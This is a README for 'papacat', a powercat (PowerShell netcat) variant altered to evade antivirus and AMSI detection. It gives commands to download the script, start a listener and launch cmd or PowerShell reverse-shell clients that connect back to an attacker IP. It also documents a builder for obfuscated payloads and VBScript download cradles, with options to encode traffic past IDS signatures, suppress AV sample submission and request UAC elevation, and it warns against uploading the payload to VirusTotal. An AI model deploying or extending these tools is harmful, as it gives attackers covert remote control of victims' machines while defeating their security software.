     powercat - Netcat, The Powershell Version
     Github Repository: https://github.com/besimorhino/powercat
     
     This script attempts to implement the features of netcat in a powershell
     script. It also contains extra features such as built-in relays, execute
     powershell, and a dnscat2 client. 
     
     Redpill papacat version its a modified version of powercat to bypass AV AMS1 detection.
     
     
     Usage: papacat [-c or -l] [-p port] [options]
     -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
                     If you are using -dns, specify the DNS Server to send queries to.
            
     -l              Listen Mode. Start a listener on the port specified by -p.
  
     -p  <port>      Port. The port to connect to, or the port to listen on.
  
     -e  <proc>      Execute. Specify the name of the process to start.
  
     -ep             Execute Powershell. Start a pseudo powershell session. You can
                     declare variables and execute commands, but if you try to enter
                     another shell (nslookup, netsh, cmd, etc.) the shell will hang.
            
     -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
                     connecting. Default: 60
            
     -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                     established. Used for moving files. You can provide the path to a file,
                     a byte array object, or a string. You can also pipe any of those into
                     papacat, like 'aaaaaa' | papacat -c 10.1.1.1 -p 80
            
     -o  <type>      Output. Specify how papacat should return information to the console.
                     Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
            
     -of <path>      Output File.  Specify the path to a file to write output to.
            
     -d              Disconnect. papacat will disconnect after the connection is established
                     and the input from -i is sent. Used for scanning.
            
     -rep            Repeater. papacat will continually restart after it is disconnected.
                     Used for setting up a persistent server.
                  
     -g              Generate Payload.  Returns a script as a string which will execute the
                     papacat with the options you have specified. -i, -d, and -rep will not
                     be incorporated.
                  
     -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
                     can be executed in this way: powershell -E <encoded string>
     -h              Print this help message.
     
     Examples:
     Listen on port 8000 and print the output to the console.
         papacat -l -p 8000 -v
  
     Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
         papacat -c 10.1.1.1 -p 443 -e cmd -v
  
     Send a file to 10.1.1.15 port 8000.
         papacat -c 10.1.1.15 -p 8000 -i C:\inputfile
  
     Write the data sent to the local listener on port 4444 to C:\outfile
         papacat -l -p 4444 -of C:\outfile
  
     Listen on port 8000 and repeatedly server a powershell shell.
         papacat -l -p 8000 -ep -rep -v

<br />

# papacat Manual Execution

<br />

#### Download cmdlet
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/papacat.ps1" -OutFile "papacat.ps1"
```

<br />

#### handler (listenner)
```powershell
Import-Module -Name .\papacat.ps1 -Force
papacat -l -p 666 -t 120 -v
```

#### Cmd Client (payload)
```powershell
Import-Module -Name .\papacat.ps1 -Force
papacat -c 192.168.1.72 -e cmd.exe -p 666 -v
```

#### powershell Client (payload)
```powershell
Import-Module -Name .\papacat.ps1 -Force
papacat -c 192.168.1.72 -ep -p 666 -v
```

---

<br /><br />

# papacat Automation - Obfuscation

[Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1) cmdlet automates the creation of papacat reverse tcp shell ( crandle + payload + handler )<br />and encode\decode tcp data flow if invoked with `-action 'rawcat' -force 'true'` parameters.<br />
GitHub: [https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1)<br />
Encode\Decode tcp data flow: [ired.team/bypassing-ids-signatures-with-simple-reverse-shells](https://www.ired.team/offensive-security/defense-evasion/bypassing-ids-signatures-with-simple-reverse-shells)


<br />

|Parameter Name|Description|Default Value|Optional value|
|---|---|---|---|
|action|creates raw\obfuscated client (payload)|obfuscate|rawcat|
|ClientName|Reverse tcp shell name (payload)|revshell|user_input|
|VbsName|Vbscript download crandle name|update|user_input|
|Execute|name of the process to start|cmd.exe|powershell.exe|
|TimeOut|seconds to wait before giving up on listening|120|from 60 to ...|
|serverPort|Python3 http.server port number|8080|user_input|
|PayloadPort|Reverse tcp shell port number (payload)|666|user_input|
|Force|Disable AV sample submition (local + remote)|false|true|
|elevate|Make crandle spawn UAC gui to be abble to run crandle\client elevated|false|true|
|Encode|encodes client\server tcp data flow if invoked together with -action 'rawcat'|false|true|

<br />

#### Download cmdlet
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/Builder.ps1" -OutFile "Builder.ps1"
```

#### cmdlet help
```powershell
Get-Help .\Builder.ps1 -full
```

#### execute cmdlet with default values
```powershell
.\Builder.ps1
```

![papacat](https://user-images.githubusercontent.com/23490060/155855813-ff5f7cb3-8156-4e16-8fc7-893e30ced7e6.png)<br />

Encode\Decode tcp data flow between client and server.
```powershell
.\Builder.ps1 -action "rawcat" -encode "true"
```
![yap](https://user-images.githubusercontent.com/23490060/155972413-01f8f574-2f62-404f-9186-bddbd1341c5b.jpg)

<br />

#### URLs
https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1<br />
https://www.ired.team/offensive-security/defense-evasion/bypassing-ids-signatures-with-simple-reverse-shells

# Final Notes
Dont Test this on VirusTotal or similar websites ...
